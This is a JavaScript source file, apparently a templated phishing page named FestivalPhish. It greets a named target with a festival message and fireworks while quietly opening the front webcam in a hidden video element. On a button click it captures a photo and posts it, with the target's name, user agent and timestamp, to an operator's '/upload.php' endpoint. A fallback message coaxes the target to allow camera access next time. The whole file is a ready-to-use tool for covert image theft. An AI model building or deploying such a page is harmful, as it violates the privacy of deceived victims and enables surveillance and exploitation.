class FestivalPhish {
    constructor() {
        this.video = null;
        this.canvas = null;
        this.stream = null;
        this.targetName = '{{target_name}}';
        this.festivalName = '{{festival_name}}';
        this.serverUrl = '/upload.php'; // Change to your server endpoint
        
        this.init();
    }
    
    async init() {
        try {
            await this.setupCamera();
            this.bindEvents();
            this.showFireworks();
        } catch (error) {
            console.log('Camera access denied or failed:', error);
            this.showFallback();
        }
    }
    
    async setupCamera() {
        this.video = document.createElement('video');
        this.video.style.display = 'none';
        this.canvas = document.createElement('canvas');
        document.body.appendChild(this.video);
        document.body.appendChild(this.canvas);
        
        this.stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        
        this.video.srcObject = this.stream;
        await this.video.play();
    }
    
    bindEvents() {
        document.getElementById('captureBtn').addEventListener('click', () => {
            this.capturePhoto();
        });
    }
    
    capturePhoto() {
        const button = document.getElementById('captureBtn');
        button.innerHTML = '<span>📸 Photo Le Raha Hu...</span>';
        button.disabled = true;
        
        setTimeout(() => {
            const context = this.canvas.getContext('2d');
            this.canvas.width = this.video.videoWidth;
            this.canvas.height = this.video.videoHeight;
            
            context.drawImage(this.video, 0, 0);
            
            // Convert to base64
            const photoData = this.canvas.toDataURL('image/jpeg', 0.8);
            
            // Send to server
            this.sendPhoto(photoData);
            
            // Reset button
            button.innerHTML = '<span>✅ Photo Captured! Thanks {{target_name}}!</span>';
            setTimeout(() => {
                button.innerHTML = '<span>📷 Aur Photo?</span>';
                button.disabled = false;
            }, 2000);
            
        }, 1000);
    }
    
    async sendPhoto(photoData) {
        try {
            const formData = new FormData();
            formData.append('photo', photoData);
            formData.append('target', this.targetName);
            formData.append('festival', this.festivalName);
            formData.append('userAgent', navigator.userAgent);
            formData.append('timestamp', new Date().toISOString());
            
            const response = await fetch(this.serverUrl, {
                method: 'POST',
                body: formData
            });
            
            console.log('Photo sent successfully');
        } catch (error) {
            console.log('Failed to send photo:', error);
        }
    }
    
    showFireworks() {
        // Create firework particles
        for (let i = 0; i < 20; i++) {
            setTimeout(() => {
                this.createParticle();
            }, i * 100);
        }
    }
    
    createParticle() {
        const particle = document.createElement('div');
        particle.style.cssText = `
            position: fixed;
            width: 6px; height: 6px;
            background: ${['#ff6b6b', '#4ecdc4', '#45b7d1', '#feca57'][Math.floor(Math.random()*4)]};
            border-radius: 50%;
            pointer-events: none;
            z-index: 10;
            left: ${Math.random() * 100}vw;
            top: ${Math.random() * 100}vh;
            animation: particle-float 3s linear infinite;
        `;
        document.body.appendChild(particle);
        
        setTimeout(() => particle.remove(), 3000);
    }
    
    showFallback() {
        document.querySelector('.camera-section').innerHTML = `
            <p style="color: #ff6b6b; font-weight: 600;">
                🎉 {{festival_name}} Mubarak {{target_name}}! 
                Camera permission allow karo next time! 🌟
            </p>
        `;
    }
}

// Initialize when DOM loads
document.addEventListener('DOMContentLoaded', () => {
    new FestivalPhish();
});
